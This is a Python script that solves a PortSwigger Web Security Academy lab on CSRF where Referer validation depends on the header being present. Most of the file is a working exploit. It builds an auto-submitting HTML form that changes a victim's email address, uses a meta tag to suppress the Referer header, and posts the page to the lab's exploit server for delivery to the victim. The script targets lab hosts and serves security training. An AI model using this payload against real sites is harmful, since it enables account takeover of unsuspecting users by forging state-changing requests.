#######################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 21/10/2023
#
# Lab: CSRF where Referer validation depends on header being present
#
# Steps: 1. Craft an HTML form for changing the email address with an auto-submit 
#           script and a meta tag that drops the Referer header from the request
#        2. Deliver the exploit to the victim
#        3. The victim's email will be changed after they trigger the exploit
#
#######################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
lab_url = "https://0a1a000103849ea38086a39e006c0091.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0a97005303699e6d8093a2a8014100d4.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    
# the new email
# you can change this to what you want
new_email = "hacked@you.com"

# payload to change the victim's email
payload = f"""<html>
                <body>
                <meta name="referrer" content="never">
                <form action="{lab_url}/my-account/change-email" method="POST">
                    <input type="hidden" name="email" value="{new_email}" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                    document.forms[0].submit();
                </script>
                </body>
            </html> """

# data to send via POST
data = {
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": exploit_server_head,
    "responseBody": payload,
}

try:
    # deliver the exploit to the victim
    res = requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to deliver the exploit to the victim through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The victim's email will be changed after they trigger the exploit") 
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



